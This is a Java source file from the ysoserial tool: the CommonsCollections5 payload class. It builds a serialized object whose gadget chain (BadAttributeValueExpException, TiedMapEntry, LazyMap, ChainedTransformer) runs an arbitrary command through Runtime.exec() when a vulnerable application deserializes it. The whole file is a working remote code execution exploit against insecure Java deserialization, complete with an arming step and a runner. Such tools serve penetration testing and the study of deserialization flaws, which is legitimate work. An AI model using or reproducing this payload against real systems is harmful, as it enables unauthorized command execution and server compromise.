package ysoserial.payloads;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import javax.management.BadAttributeValueExpException;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.annotation.Bind;
import ysoserial.interfaces.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain:	
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()				
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()										
	
	Requires:
		commons-collections
		no security manager
 */
@PayloadTest(skip="need more robust way to detect Runtime.exec() without SecurityManager()")
@SuppressWarnings({"rawtypes"})
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
	
	@Bind private String command;
	
	/**
	 * @deprecated Use {@link #getObject()} instead
	 */
	public BadAttributeValueExpException getObject(final String command) throws Exception {
		return getObject();
	}

	public BadAttributeValueExpException getObject() throws Exception {
		final String[] execArgs = new String[] { command };
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
		        new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] {
					String.class, Class[].class }, new Object[] {
					"getRuntime", new Class[0] }),
				new InvokerTransformer("invoke", new Class[] {
					Object.class, Object[].class }, new Object[] {
					null, new Object[0] }),
				new InvokerTransformer("exec",
					new Class[] { String.class }, execArgs),
				new ConstantTransformer(1) };

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
		
		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Field valfield = val.getClass().getDeclaredField("val");
		valfield.setAccessible(true);
		valfield.set(val, entry);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return val;
	}
	
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections5.class, args);
	}
}
